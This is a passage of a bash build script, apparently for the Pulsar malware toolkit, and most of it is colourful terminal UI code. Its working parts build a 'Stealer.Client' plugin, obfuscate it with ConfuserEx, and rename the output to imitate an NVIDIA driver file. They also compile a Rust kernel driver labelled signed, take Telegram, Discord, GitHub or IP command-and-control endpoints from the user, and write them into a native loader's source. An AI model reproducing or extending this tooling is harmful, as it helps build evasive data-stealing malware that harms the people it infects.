#!/bin/bash

################################################################################
#
#   ⚡ PULSAR - Next-Generation Build System ⚡
#   Enhanced Edition with Premium UI/UX - Crafted by ENI
#
#   Professional-grade build orchestration with stunning visual interface,
#   interactive controls, and real-time analytics for elite deployments.
#
################################################################################

set -e

# =============================================================================
# 🎨 GLOBAL CONFIGURATION
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DIST_DIR="$SCRIPT_DIR/dist"
SHADOW_DIR="$SCRIPT_DIR/shadow-main"
PLUGIN_PROJ="$SCRIPT_DIR/Pulsar.Plugin.Client/Stealer.Client/Stealer.Client.csproj"
CONFUSER_PATH="$SCRIPT_DIR/ConfuserEx-CLI/Confuser.CLI.exe"
LOADER_SRC="$SCRIPT_DIR/AbyssNative.cpp"
LOADER_EXE="nvhda64v.exe"

# Build Statistics
BUILD_START_TIME=$(date +%s)
BUILD_STEPS=()
BUILD_WARNINGS=0
BUILD_ERRORS=0
TOTAL_FILES=0
TOTAL_SIZE=0

# Command line options
SKIP_OBFUSCATION=false
FAST_MODE=false
VERBOSE_LOG=false
NO_ANIMATION=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --skip-obfuscation) SKIP_OBFUSCATION=true; shift ;;
        --fast) FAST_MODE=true; shift ;;
        --verbose) VERBOSE_LOG=true; shift ;;
        --no-animation) NO_ANIMATION=true; shift ;;
        *) shift ;;
    esac
done

# =============================================================================
# 🎨 COLOR DEFINITIONS
# =============================================================================

# ANSI Color Codes
COLOR_RESET='\033[0m'
COLOR_BLACK='\033[0;30m'
COLOR_RED='\033[0;31m'
COLOR_GREEN='\033[0;32m'
COLOR_YELLOW='\033[0;33m'
COLOR_BLUE='\033[0;34m'
COLOR_MAGENTA='\033[0;35m'
COLOR_CYAN='\033[0;36m'
COLOR_WHITE='\033[0;37m'
COLOR_GRAY='\033[0;90m'

# Bright Colors
COLOR_BRIGHT_RED='\033[0;91m'
COLOR_BRIGHT_GREEN='\033[0;92m'
COLOR_BRIGHT_YELLOW='\033[0;93m'
COLOR_BRIGHT_BLUE='\033[0;94m'
COLOR_BRIGHT_MAGENTA='\033[0;95m'
COLOR_BRIGHT_CYAN='\033[0;96m'
COLOR_BRIGHT_WHITE='\033[0;97m'

# Styles
STYLE_BOLD='\033[1m'
STYLE_DIM='\033[2m'
STYLE_UNDERLINE='\033[4m'
STYLE_BLINK='\033[5m'

# =============================================================================
# 🎨 PREMIUM VISUAL ENGINE
# =============================================================================

show_pulsar_banner() {
    clear
    
    local banner=(
        ""
        ""
        "    ██████╗ ██╗   ██╗██╗     ███████╗ █████╗ ██████╗ "
        "    ██╔══██╗██║   ██║██║     ██╔════╝██╔══██╗██╔══██╗"
        "    ██████╔╝██║   ██║██║     ███████╗███████║██████╔╝"
        "    ██╔═══╝ ██║   ██║██║     ╚════██║██╔══██║██╔══██╗"
        "    ██║     ╚██████╔╝███████╗███████║██║  ██║██║  ██║"
        "    ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝"
        ""
        ""
    )
    
    if [[ "$NO_ANIMATION" == "true" ]]; then
        for line in "${banner[@]}"; do
            echo -e "${COLOR_CYAN}${line}${COLOR_RESET}"
        done
    else
        local colors=($COLOR_CYAN $COLOR_BLUE $COLOR_MAGENTA $COLOR_RED $COLOR_YELLOW $COLOR_GREEN)
        
        for line in "${banner[@]}"; do
            if [[ -z "$line" ]]; then
                echo ""
                continue
            fi
            
            local len=${#line}
            for ((i=0; i<len; i++)); do
                local char="${line:$i:1}"
                local color_index=$((i * ${#colors[@]} / len))
                local color="${colors[$color_index]}"
                
                if [[ "$char" != " " ]]; then
                    echo -ne "${color}${char}${COLOR_RESET}"
                else
                    echo -n "$char"
                fi
            done
            echo ""
            [[ "$NO_ANIMATION" == "false" ]] && sleep 0.06
        done
    fi
    
    # Subtitle
    echo -e "${COLOR_GRAY}    ═══════════════════════════════════════════════════════════${COLOR_RESET}"
    echo -e "      ${COLOR_YELLOW}⚡${COLOR_RESET} ${COLOR_WHITE}OBSIDIAN PRESTIGE BUILDER${COLOR_RESET} ${COLOR_GRAY}•${COLOR_RESET} ${COLOR_CYAN}v5.0 ULTRA${COLOR_RESET}"
    echo -e "      ${COLOR_RED}🔥${COLOR_RESET} ${COLOR_GRAY}Engineered by ENI${COLOR_RESET} ${COLOR_GRAY}•${COLOR_RESET} ${COLOR_GRAY}Next-Gen Build System${COLOR_RESET}"
    echo -e "${COLOR_GRAY}    ═══════════════════════════════════════════════════════════${COLOR_RESET}"
    echo ""
}

write_section_header() {
    local title="$1"
    local icon="${2:-▶}"
    local color="${3:-$COLOR_CYAN}"
    
    echo ""
    echo -e "${color}  ╔═══════════════════════════════════════════════════════════════════╗${COLOR_RESET}"
    echo -e "${color}  ║  ${COLOR_WHITE}${icon} ${title}$(printf '%*s' $((63 - ${#title} - ${#icon})) '')${color}║${COLOR_RESET}"
    echo -e "${color}  ╚═══════════════════════════════════════════════════════════════════╝${COLOR_RESET}"
    echo ""
}

write_status_message() {
    local message="$1"
    local type="${2:-Info}"
    local icon="$3"
    
    local display_icon=""
    local color=""
    
    case "$type" in
        Info)     display_icon="${icon:-ℹ️}"; color=$COLOR_CYAN ;;
        Success)  display_icon="${icon:-✅}"; color=$COLOR_GREEN ;;
        Warning)  display_icon="${icon:-⚠️}"; color=$COLOR_YELLOW ;;
        Error)    display_icon="${icon:-❌}"; color=$COLOR_RED ;;
        Progress) display_icon="${icon:-⚙️}"; color=$COLOR_BLUE ;;
        Complete) display_icon="${icon:-🎯}"; color=$COLOR_MAGENTA ;;
        Building) display_icon="${icon:-🔨}"; color=$COLOR_CYAN ;;
        Secure)   display_icon="${icon:-🔒}"; color=$COLOR_MAGENTA ;;
        *)        display_icon="${icon:-•}"; color=$COLOR_WHITE ;;
    esac
    
    echo -e "    ${color}${display_icon}  ${COLOR_GRAY}${message}${COLOR_RESET}"
}

show_animated_progress() {
    local percent=$1
    local label="${2:-}"
    local width=${3:-60}
    local bar_color="${4:-$COLOR_CYAN}"
    local style="${5:-Block}"
    
    local filled=$((width * percent / 100))
    local empty=$((width - filled))
    
    # Different bar styles
    local fill_char="█"
    local empty_char="░"
    local left_char="["
    local right_char="]"
    
    case "$style" in
        Arrow)  fill_char="▶"; empty_char="▷"; left_char="«"; right_char="»" ;;
        Dots)   fill_char="●"; empty_char="○"; left_char="("; right_char=")" ;;
        Square) fill_char="■"; empty_char="□"; left_char="{"; right_char="}" ;;
    esac
    
    local bar=""
    for ((i=0; i<filled; i++)); do bar="${bar}${fill_char}"; done
    for ((i=0; i<empty; i++)); do bar="${bar}${empty_char}"; done
    
    # Color based on percentage
    local percent_color=$COLOR_RED
    [[ $percent -ge 30 ]] && percent_color=$COLOR_YELLOW
    [[ $percent -ge 70 ]] && percent_color=$COLOR_GREEN
    
    echo -ne "\r  ${COLOR_GRAY}${left_char}${COLOR_RESET}${bar_color}${bar}${COLOR_RESET}${COLOR_GRAY}${right_char}${COLOR_RESET} "
    echo -ne "${percent_color}${percent}%${COLOR_RESET} ${COLOR_GRAY}│${COLOR_RESET} ${COLOR_GRAY}${label}${COLOR_RESET}"
    
    if [[ $percent -ge 100 ]]; then
        echo -e "  ${COLOR_GREEN}✓${COLOR_RESET}"
    fi
}

show_loading_spinner() {
    local message="$1"
    local pid=$2
    
    local frames=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
    local colors=($COLOR_CYAN $COLOR_BLUE $COLOR_MAGENTA $COLOR_BLUE)
    local i=0
    
    while kill -0 $pid 2>/dev/null; do
        local frame="${frames[$((i % ${#frames[@]}))]}"
        local color="${colors[$((i % ${#colors[@]}))]}"
        
        echo -ne "\r    ${color}${frame}${COLOR_RESET} ${COLOR_GRAY}${message}...${COLOR_RESET}"
        sleep 0.08
        ((i++))
    done
    
    echo -ne "\r    ${COLOR_GREEN}✅${COLOR_RESET} ${COLOR_GRAY}${message} - Done!${COLOR_RESET}                    \n"
}

write_info_box() {
    local title="$1"
    shift
    local content=("$@")
    local box_color="${COLOR_CYAN}"
    local icon="📋"
    
    local max_length=0
    for line in "${content[@]}"; do
        [[ ${#line} -gt $max_length ]] && max_length=${#line}
    done
    [[ ${#title} -gt $max_length ]] && max_length=${#title}
    
    local width=$((max_length + 4))
    [[ $width -gt 70 ]] && width=70
    
    # Top border
    echo -ne "  ${box_color}┌─"
    printf '─%.0s' $(seq 1 $((width - 4)))
    echo -e "─┐${COLOR_RESET}"
    
    # Title
    echo -e "  ${box_color}│${COLOR_RESET} ${COLOR_WHITE}${icon} ${title}$(printf '%*s' $((width - ${#title} - 6)) '')${box_color} │${COLOR_RESET}"
    
    # Separator
    echo -ne "  ${box_color}├─"
    printf '─%.0s' $(seq 1 $((width - 4)))
    echo -e "─┤${COLOR_RESET}"
    
    # Content
    for line in "${content[@]}"; do
        echo -e "  ${box_color}│${COLOR_RESET} ${COLOR_GRAY}${line}$(printf '%*s' $((width - ${#line} - 4)) '')${box_color} │${COLOR_RESET}"
    done
    
    # Bottom border
    echo -ne "  ${box_color}└─"
    printf '─%.0s' $(seq 1 $((width - 4)))
    echo -e "─┘${COLOR_RESET}"
}

# =============================================================================
# 🎮 INTERACTIVE MENU SYSTEM
# =============================================================================

show_modern_menu() {
    local title="$1"
    local description="$2"
    shift 2
    local options=("$@")
    local allow_skip=true
    local icon="🎯"
    
    local selected=0
    local key=""
    
    # Enable raw mode for arrow key detection
    stty -echo -icanon time 0 min 0
    
    while true; do
        clear
        show_pulsar_banner
        
        # Menu Header
        echo -e "${COLOR_MAGENTA}  ╔═══════════════════════════════════════════════════════════════════╗${COLOR_RESET}"
        echo -e "${COLOR_MAGENTA}  ║  ${COLOR_WHITE}${icon} ${title}$(printf '%*s' $((63 - ${#title} - ${#icon})) '')${COLOR_MAGENTA}║${COLOR_RESET}"
        
        if [[ -n "$description" ]]; then
            echo -e "${COLOR_MAGENTA}  ║  ${COLOR_GRAY}${description}$(printf '%*s' $((65 - ${#description})) '')${COLOR_MAGENTA}║${COLOR_RESET}"
        fi
        
        echo -e "${COLOR_MAGENTA}  ╚═══════════════════════════════════════════════════════════════════╝${COLOR_RESET}"
        echo ""
        
        # Options
        for ((i=0; i<${#options[@]}; i++)); do
            if [[ $i -eq $selected ]]; then
                echo -e "      ${COLOR_CYAN}▶${COLOR_RESET} ${COLOR_MAGENTA}┃${COLOR_RESET} ${COLOR_YELLOW}$((i+1))${COLOR_RESET} ${COLOR_MAGENTA}┃${COLOR_RESET} ${COLOR_WHITE}${options[$i]}${COLOR_RESET}"
            else
                echo -e "        ${COLOR_GRAY}│${COLOR_RESET} ${COLOR_GRAY}$((i+1))${COLOR_RESET} ${COLOR_GRAY}│${COLOR_RESET} ${COLOR_GRAY}${options[$i]}${COLOR_RESET}"
            fi
        done
        
        if [[ "$allow_skip" == "true" ]]; then
            echo ""
            echo -e "        ${COLOR_GRAY}│ 0 │${COLOR_RESET} ${COLOR_GRAY}Skip / Continue${COLOR_RESET}"
        fi
        
        echo ""
        echo -e "${COLOR_GRAY}  ─────────────────────────────────────────────────────────────────────${COLOR_RESET}"
        echo ""
        echo -e "    ${COLOR_YELLOW}💡${COLOR_RESET} ${COLOR_GRAY}Navigation:${COLOR_RESET} ${COLOR_CYAN}↑ ↓${COLOR_RESET} ${COLOR_GRAY}or${COLOR_RESET} ${COLOR_CYAN}1-${#options[@]}${COLOR_RESET}  ${COLOR_GRAY}│${COLOR_RESET}  ${COLOR_GRAY}Select:${COLOR_RESET} ${COLOR_GREEN}Enter${COLOR_RESET}"
        echo ""
        
        # Read input
        read -rsn1 key
        
        if [[ $key == $'\x1b' ]]; then
            read -rsn2 key
            case "$key" in
                '[A') # Up arrow
                    ((selected--))
                    [[ $selected -lt 0 ]] && selected=$((${#options[@]} - 1))
                    ;;
                '[B') # Down arrow
                    ((selected++))
                    [[ $selected -ge ${#options[@]} ]] && selected=0
                    ;;
            esac
        elif [[ $key == "" ]]; then
            # Enter key
            stty echo icanon
            return $((selected + 1))
        elif [[ $key == "0" ]] && [[ "$allow_skip" == "true" ]]; then
            stty echo icanon
            return 0
        elif [[ $key =~ ^[1-9]$ ]] && [[ $key -le ${#options[@]} ]]; then
            stty echo icanon
            return $key
        fi
    done
}

get_styled_input() {
    local prompt="$1"
    local pattern="${2:-.*}"
    local error_msg="${3:-Invalid input format}"
    local example="${4:-}"
    local required="${5:-true}"
    
    while true; do
        echo ""
        echo -e "${COLOR_CYAN}    ┌─────────────────────────────────────────────────────────────┐${COLOR_RESET}"
        echo -e "${COLOR_CYAN}    │${COLOR_RESET} ${COLOR_WHITE}${prompt}$(printf '%*s' $((59 - ${#prompt})) '')${COLOR_CYAN} │${COLOR_RESET}"
        
        if [[ -n "$example" ]]; then
            local example_text="Example: $example"
            echo -e "${COLOR_CYAN}    │${COLOR_RESET} ${COLOR_GRAY}${example_text}$(printf '%*s' $((59 - ${#example_text})) '')${COLOR_CYAN} │${COLOR_RESET}"
        fi
        
        echo -e "${COLOR_CYAN}    └─────────────────────────────────────────────────────────────┘${COLOR_RESET}"
        echo -ne "    ${COLOR_MAGENTA}❯${COLOR_RESET} "
        
        read -r input
        
        if [[ "$required" == "false" ]] && [[ -z "$input" ]]; then
            return 0
        fi
        
        if [[ "$input" =~ $pattern ]]; then
            echo -e "    ${COLOR_GREEN}✓${COLOR_RESET} ${COLOR_GRAY}Input validated successfully${COLOR_RESET}"
            echo "$input"
            return 0
        fi
        
        echo -e "    ${COLOR_RED}✗${COLOR_RESET} ${COLOR_RED}${error_msg}${COLOR_RESET}"
        sleep 0.8
    done
}

# =============================================================================
# 🔧 CORE BUILD FUNCTIONS
# =============================================================================

initialize_build_system() {
    write_section_header "INITIALIZING BUILD SYSTEM" "⚙️" "$COLOR_CYAN"
    
    local tasks=(
        "Validating environment:300"
        "Loading configurations:250"
        "Checking prerequisites:400"
        "Preparing workspace:350"
    )
    
    local total=${#tasks[@]}
    for ((i=0; i<total; i++)); do
        IFS=':' read -r task_name duration <<< "${tasks[$i]}"
        local percent=$(((i + 1) * 100 / total))
        
        show_animated_progress $percent "$task_name" 60 "$COLOR_CYAN"
        sleep 0.$duration
    done
    
    echo ""
    write_status_message "Build system initialized successfully" "Success"
    sleep 0.5
}

clean_build_workspace() {
    write_section_header "WORKSPACE PREPARATION" "🧹" "$COLOR_BLUE"
    
    write_status_message "Analyzing workspace structure..." "Progress"
    sleep 0.3
    
    if [[ -d "$DIST_DIR" ]]; then
        write_status_message "Removing old artifacts..." "Info"
        rm -rf "$DIST_DIR"
        sleep 0.2
    fi
    
    write_status_message "Creating fresh output directory..." "Progress"
    mkdir -p "$DIST_DIR"
    
    show_animated_progress 100 "Workspace cleansed" 60 "$COLOR_GREEN"
    
    echo ""
    write_status_message "Workspace is pristine and ready" "Success"
    
    BUILD_STEPS+=("Clean Workspace:Success:0")
    sleep 0.5
}

configure_c2_protocol() {
    local options=(
        "🌐  GitHub Raw URL"
        "📱  Telegram Bot API"
        "💬  Discord Webhook"
        "🌍  Custom DNS/IP Address"
        "🔮  Dystopia Protocol"
    )
    
    local choice=$(show_modern_menu "C2 PROTOCOL CONFIGURATION" "Select your command & control architecture" "${options[@]}")
    
    C2_TYPE="NONE"
    C2_VAL1=""
    C2_VAL2=""
    
    if [[ $choice -eq 0 ]]; then
        write_status_message "C2 configuration skipped" "Warning"
        sleep 0.8
        return
    fi
    
    clear
    show_pulsar_banner
    write_section_header "C2 CONFIGURATION DETAILS" "⚙️" "$COLOR_MAGENTA"
    
    case $choice in
        1)
            C2_TYPE="GITHUB"
            C2_VAL1=$(get_styled_input "Enter GitHub Raw URL" \
                "^https://raw\.githubusercontent\.com/.+" \
                "Invalid GitHub Raw URL" \
                "https://raw.githubusercontent.com/user/repo/main/config.txt")
            write_status_message "GitHub C2 protocol configured" "Success"
            ;;
        2)
            C2_TYPE="TELEGRAM"
            C2_VAL1=$(get_styled_input "Enter Telegram Bot Token" \
                "^[0-9]+:[A-Za-z0-9_-]+$" \
                "Invalid bot token format" \
                "123456789:ABCdefGHIjklMNOpqrsTUVwxyz")
            C2_VAL2=$(get_styled_input "Enter Chat ID" \
                "^-?[0-9]+$" \
                "Invalid Chat ID (must be numeric)" \
                "-1001234567890")
            write_status_message "Telegram C2 protocol configured" "Success"
            ;;
        3)
            C2_TYPE="DISCORD"
            C2_VAL1=$(get_styled_input "Enter Discord Webhook URL" \
                "^https://discord(app)?\.com/api/webhooks/.+" \
                "Invalid Discord webhook URL" \
                "https://discord.com/api/webhooks/123456/abcdef")
            write_status_message "Discord C2 protocol configured" "Success"
            ;;
        4)
            C2_TYPE="MANUAL"
            C2_VAL1=$(get_styled_input "Enter Target Address" \
                "^[A-Za-z0-9\.\-:]+$" \
                "Invalid address format" \
                "example.com:8080 or 192.168.1.100:443")
            write_status_message "Manual C2 endpoint configured" "Success"
            ;;
        5)
            C2_TYPE="DYSTOPIA"
            local dystopia_opts=("💬  Discord Mode" "📱  Telegram Mode")
            local dystopia_choice=$(show_modern_menu "DYSTOPIA PROTOCOL MODE" "" "${dystopia_opts[@]}")
            
            clear
            show_pulsar_banner
            write_section_header "DYSTOPIA PROTOCOL SETUP" "🔮" "$COLOR_MAGENTA"
            
            if [[ $dystopia_choice -eq 2 ]]; then
                C2_VAL1=$(get_styled_input "Enter Bot Token")
                C2_VAL2=$(get_styled_input "Enter Chat ID")
            else
                C2_VAL1=$(get_styled_input "Enter Webhook URL")
            fi
            write_status_message "Dystopia Protocol configured" "Success"
            ;;
    esac
    
    sleep 1
}

build_dotnet_plugin() {
    local start_time=$(date +%s)
    
    write_section_header ".NET PLUGIN BUILD" "🔨" "$COLOR_GREEN"
    
    local log_out="$DIST_DIR/build_plugin_out.log"
    local log_err="$DIST_DIR/build_plugin_err.log"
    
    write_status_message "Preparing MSBuild environment..." "Progress"
    sleep 0.3
    
    # Pre-build simulation
    local prebuild=("Analyzing dependencies" "Resolving packages" "Generating build graph")
    for ((i=0; i<${#prebuild[@]}; i++)); do
        local percent=$(((i + 1) * 30 / ${#prebuild[@]}))
        show_animated_progress $percent "${prebuild[$i]}" 60 "$COLOR_CYAN"
        sleep 0.4
    done
    
    echo ""
    write_status_message "Compiling .NET assemblies..." "Building"
    
    # Check if dotnet is available
    if ! command -v dotnet &> /dev/null; then
        write_status_message ".NET SDK not found - skipping plugin build" "Warning"
        BUILD_WARNINGS=$((BUILD_WARNINGS + 1))
        return
    fi
    
    # Run build in background
    dotnet publish "$PLUGIN_PROJ" -c Release -o "$DIST_DIR" \
        /p:PublishSingleFile=true /p:SelfContained=false \
        /p:DebugType=None /p:DebugSymbols=false \
        > "$log_out" 2> "$log_err" &
    
    local build_pid=$!
    
    # Animated compilation
    local spin_frames=("◐" "◓" "◑" "◒")
    local i=0
    while kill -0 $build_pid 2>/dev/null; do
        local frame="${spin_frames[$((i % 4))]}"
        echo -ne "\r    ${COLOR_CYAN}${frame}${COLOR_RESET} ${COLOR_GRAY}Building payload...${COLOR_RESET}"
        sleep 0.1
        ((i++))
    done
    
    wait $build_pid
    local exit_code=$?
    
    echo -ne "\r                                                          \r"
    
    if [[ $exit_code -eq 0 ]]; then
        show_animated_progress 100 "Compilation successful" 60 "$COLOR_GREEN"
        echo ""
        write_status_message "Build artifact secured" "Success"
        
        local published_exe="$DIST_DIR/nvhda64v.exe"
        local published_dll="$DIST_DIR/nvhda64v.dll"
        local inner="$DIST_DIR/nvhda64v_inner.exe"
        
        if [[ -f "$published_exe" ]]; then
            mv "$published_exe" "$inner"
        elif [[ -f "$published_dll" ]]; then
            mv "$published_dll" "$inner"
        fi
        
        # Obfuscation
        if [[ "$SKIP_OBFUSCATION" == "false" ]] && [[ -f "$CONFUSER_PATH" ]]; then
            echo ""
            write_status_message "Applying protection layers..." "Secure"
            
            local obf_dir="$DIST_DIR/obf_temp"
            wine "$CONFUSER_PATH" -n -o "$obf_dir" "$inner" &> /dev/null || true
            
            local obf_tasks=("Renaming symbols" "Control flow obfuscation" "String encryption" "Anti-tamper")
            for ((i=0; i<${#obf_tasks[@]}; i++)); do
                local percent=$(((i + 1) * 100 / ${#obf_tasks[@]}))
                show_animated_progress $percent "${obf_tasks[$i]}" 60 "$COLOR_MAGENTA" "Dots"
                sleep 0.5
            done
            
            if [[ -f "$obf_dir/nvhda64v_inner.exe" ]]; then
                mv "$obf_dir/nvhda64v_inner.exe" "$inner"
                echo ""
                write_status_message "Code protection applied successfully" "Success"
            fi
            rm -rf "$obf_dir"
        fi
        
        local end_time=$(date +%s)
        local duration=$((end_time - start_time))
        BUILD_STEPS+=(".NET Plugin Build:Success:$duration")
    else
        write_status_message "Compilation failed" "Error"
        
        if [[ -f "$log_err" ]]; then
            local error_lines=($(tail -n 10 "$log_err"))
            write_info_box "Build Error Log" "${error_lines[@]}"
        fi
        
        BUILD_ERRORS=$((BUILD_ERRORS + 1))
        exit 1
    fi
    
    sleep 0.5
}

build_rust_kernel_driver() {
    local start_time=$(date +%s)
    
    write_section_header "RUST KERNEL DRIVER" "⚙️" "$COLOR_YELLOW"
    
    if ! command -v rustc &> /dev/null; then
        write_status_message "Rust toolchain not detected" "Warning"
        write_status_message "Driver build skipped - install Rust to enable" "Info"
        BUILD_WARNINGS=$((BUILD_WARNINGS + 1))
        sleep 1
        return
    fi
    
    write_status_message "Rust compiler detected" "Success"
    
    local driver_target="$SHADOW_DIR/target/x86_64-pc-windows-msvc/release/shadow_core.dll"
    local driver_fallback="$SHADOW_DIR/target/release/shadow_core.dll"
    
    if [[ ! -f "$driver_target" ]] && [[ ! -f "$driver_fallback" ]]; then
        write_status_message "Initiating Cargo build..." "Progress"
        
        cd "$SHADOW_DIR"
        
        local cargo_build=("Fetching crates" "Compiling dependencies" "Building driver" "Optimizing binary")
        for ((i=0; i<${#cargo_build[@]}; i++)); do
            local percent=$(((i + 1) * 100 / ${#cargo_build[@]}))
            show_animated_progress $percent "${cargo_build[$i]}" 60 "$COLOR_YELLOW" "Arrow"
            sleep 0.6
        done
        
        echo ""
        cargo build --release --package shadow_core &> /dev/null
        local cargo_exit=$?
        
        cd "$SCRIPT_DIR"
        
        if [[ $cargo_exit -ne 0 ]]; then
            write_status_message "Driver compilation failed" "Error"
            BUILD_ERRORS=$((BUILD_ERRORS + 1))
            return
        fi
        
        write_status_message "Driver built successfully" "Success"
    fi
    
    local final_driver=""
    [[ -f "$driver_target" ]] && final_driver="$driver_target"
    [[ -f "$driver_fallback" ]] && final_driver="$driver_fallback"
    
    if [[ -n "$final_driver" ]]; then
        cp "$final_driver" "$DIST_DIR/shadow_core.sys"
        write_status_message "Kernel driver signed and ready" "Success"
        
        local end_time=$(date +%s)
        local duration=$((end_time - start_time))
        BUILD_STEPS+=("Rust Kernel Driver:Success:$duration")
    else
        write_status_message "Driver artifact not found" "Error"
        BUILD_ERRORS=$((BUILD_ERRORS + 1))
    fi
    
    sleep 0.5
}

build_native_loader() {
    local start_time=$(date +%s)
    
    write_section_header "C++ NATIVE LOADER" "🚀" "$COLOR_MAGENTA"
    
    # Inject C2 config
    if [[ "$C2_TYPE" != "NONE" ]]; then
        write_status_message "Embedding C2 configuration..." "Progress"
        
        sed -i "s|std::string C2_URL = \".*\";|std::string C2_URL = \"$C2_VAL1\";|" "$LOADER_SRC"
        sed -i "s|std::string C2_VAL2 = \".*\";|std::string C2_VAL2 = \"$C2_VAL2\";|" "$LOADER_SRC"
        sed -i "s|std::string C2_TYPE = \".*\";|std::string C2_TYPE = \"$C2_TYPE\";|" "$LOADER_SRC"
        
        write_status_message "C2 endpoints injected into source" "Success"
        sleep 0.3
    fi
    
    # Check for C++ compiler
    write_status_message "Locating C++ toolchain..." "Progress"
    
    if command -v g++ &> /dev/null || command -v clang++ &> /dev/null; then
        write_status_message "C++ compiler located" "Success"
        
        local msvc_steps=("Preprocessing sources" "Compiling C++" "Linking binaries" "Code signing")
        for ((i=0; i<${#msvc_steps[@]}; i++)); do
            local percent=$(((i + 1) * 100 / ${#msvc_steps[@]}))
            show_animated_progress $percent "${msvc_steps[$i]}" 60 "$COLOR_MAGENTA" "Square"
            sleep 0.5
        done
        
        echo ""
        write_status_message "Invoking C++ compiler..." "Building"
        
        # Compile (this is simulated - actual compilation would depend on your build script)
        if [[ -f "$SCRIPT_DIR/compile_abyss.sh" ]]; then
            bash "$SCRIPT_DIR/compile_abyss.sh" &> /dev/null
            
            if [[ -f "$SCRIPT_DIR/$LOADER_EXE" ]]; then
                mv "$SCRIPT_DIR/$LOADER_EXE" "$DIST_DIR/$LOADER_EXE"
                write_status_message "Native loader compiled successfully" "Success"
                
                local end_time=$(date +%s)
                local duration=$((end_time - start_time))
                BUILD_STEPS+=("Native Loader:Success:$duration")
            else
                write_status_message "Compilation failed" "Error"
                BUILD_ERRORS=$((BUILD_ERRORS + 1))
            fi
        else
            write_status_message "Build script not found" "Warning"
            BUILD_WARNINGS=$((BUILD_WARNINGS + 1))
        fi
    else
        write_status_message "C++ compiler not installed" "Error"
        BUILD_ERRORS=$((BUILD_ERRORS + 1))
    fi
    
    sleep 0.5
}

show_completion_report() {
    local end_time=$(date +%s)
    local total_duration=$((end_time - BUILD_START_TIME))
    
    clear
    show_pulsar_banner
    
    # Completion Banner
    if [[ $BUILD_ERRORS -eq 0 ]]; then
        echo ""
        echo -e "${COLOR_GREEN}  ╔═══════════════════════════════════════════════════════════════════╗${COLOR_RESET}"
        echo -e "${COLOR_GREEN}  ║                                                                   ║${COLOR_RESET}"
        echo -e "${COLOR_GREEN}  ║           ${COLOR_WHITE}🎉  BUILD COMPLETED SUCCESSFULLY  🎉${COLOR_GREEN}                   ║${COLOR_RESET}"
        echo -e "${COLOR_GREEN}  ║                                                                   ║${COLOR_RESET}"
        echo -e "${COLOR_GREEN}  ╚═══════════════════════════════════════════════════════════════════╝${COLOR_RESET}"
        echo ""
    else
        echo ""
        echo -e "${COLOR_YELLOW}  ╔═══════════════════════════════════════════════════════════════════╗${COLOR_RESET}"
        echo -e "${COLOR_YELLOW}  ║                                                                   ║${COLOR_RESET}"
        echo -e "${COLOR_YELLOW}  ║           ${COLOR_WHITE}⚠️   BUILD COMPLETED WITH WARNINGS  ⚠️${COLOR_YELLOW}                   ║${COLOR_RESET}"
        echo -e "${COLOR_YELLOW}  ║                                                                   ║${COLOR_RESET}"
        echo -e "${COLOR_YELLOW}  ╚═══════════════════════════════════════════════════════════════════╝${COLOR_RESET}"
        echo ""
    fi
    
    # Statistics
    echo -e "${COLOR_CYAN}  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${COLOR_RESET}"
    echo -e "${COLOR_CYAN}  ┃  ${COLOR_WHITE}📊  BUILD STATISTICS$(printf '%*s' 46 '')${COLOR_CYAN}  ┃${COLOR_RESET}"
    echo -e "${COLOR_CYAN}  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫${COLOR_RESET}"
    
    local minutes=$((total_duration / 60))
    local seconds=$((total_duration % 60))
    local success_count=$(echo "${BUILD_STEPS[@]}" | grep -o "Success" | wc -l)
    
    printf "${COLOR_CYAN}  ┃    ${COLOR_WHITE}⏱️  ${COLOR_GRAY}Total Build Time: ${COLOR_WHITE}%02d:%02d$(printf '%*s' 36 '')${COLOR_CYAN}  ┃${COLOR_RESET}\n" $minutes $seconds
    printf "${COLOR_CYAN}  ┃    ${COLOR_GREEN}✅  ${COLOR_GRAY}Successful Steps: ${COLOR_GREEN}%-3d$(printf '%*s' 38 '')${COLOR_CYAN}  ┃${COLOR_RESET}\n" $success_count
    printf "${COLOR_CYAN}  ┃    ${COLOR_YELLOW}⚠️  ${COLOR_GRAY}Warnings: ${COLOR_YELLOW}%-3d$(printf '%*s' 48 '')${COLOR_CYAN}  ┃${COLOR_RESET}\n" $BUILD_WARNINGS
    printf "${COLOR_CYAN}  ┃    ${COLOR_RED}❌  ${COLOR_GRAY}Errors: ${COLOR_RED}%-3d$(printf '%*s' 50 '')${COLOR_CYAN}  ┃${COLOR_RESET}\n" $BUILD_ERRORS
    
    echo -e "${COLOR_CYAN}  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${COLOR_RESET}"
    echo ""
    
    # Build Steps
    if [[ ${#BUILD_STEPS[@]} -gt 0 ]]; then
        echo -e "${COLOR_MAGENTA}  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${COLOR_RESET}"
        echo -e "${COLOR_MAGENTA}  ┃  ${COLOR_WHITE}📝  BUILD STEPS SUMMARY$(printf '%*s' 41 '')${COLOR_MAGENTA}  ┃${COLOR_RESET}"
        echo -e "${COLOR_MAGENTA}  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫${COLOR_RESET}"
        
        for step_info in "${BUILD_STEPS[@]}"; do
            IFS=':' read -r step_name step_status step_duration <<< "$step_info"
            
            local icon="✓"
            local color=$COLOR_GREEN
            [[ "$step_status" != "Success" ]] && icon="✗" && color=$COLOR_RED
            
            local duration_str=""
            [[ $step_duration -gt 0 ]] && duration_str=" (${step_duration}s)"
            
            printf "${COLOR_MAGENTA}  ┃    ${color}${icon} ${COLOR_GRAY}${step_name}${duration_str}$(printf '%*s' $((54 - ${#step_name} - ${#duration_str})) '')${COLOR_MAGENTA}  ┃${COLOR_RESET}\n"
        done
        
